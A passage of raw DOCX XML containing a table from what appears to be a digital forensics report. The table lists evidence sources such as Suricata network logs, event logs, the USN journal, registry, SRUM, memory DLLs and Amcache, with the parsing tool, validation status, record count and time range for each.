        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:11:17</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network flows (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>65044</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:58:07.470329</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:38:57.828520</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MFTECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>43463</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:31:32.608700</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:17:47.706373</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EvtxECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>40917</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 04:58:02.306798</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:18:43.987744</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>TLS (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>30453</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:58:07.470323</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:38:39.310228</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>OneDrive (ODL logs)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>odl.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>13574</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 04:58:29.242000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:16:50.303000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>8634</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:15:07.502653</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:16:55.660092</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Search (indexed files)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SIDR</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>5140</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-06 17:04:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:09:29.386591</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Search (Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>5130</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-06 17:04:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:37:05.411514</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$LogFile (reconstructed USN)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LogFileParser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>4291</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:51:36.569464</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:19:28.114044</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>DNS (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2650</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:58:49.238799</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:38:39.007813</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (application timeline)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SrumECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2415</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:41:41</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: loaded DLLs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Volatility 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1408</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:24:08</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:10:23</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network events (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1233</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:58:07.470323</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:37:22.585366</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: services</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>901</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:14:17.565307</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:10:38.974406</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (application resources)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SrumECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>766</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:46:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (drivers)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AmcacheParser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>746</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:07:47</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:31:37.056365</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MUICache</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
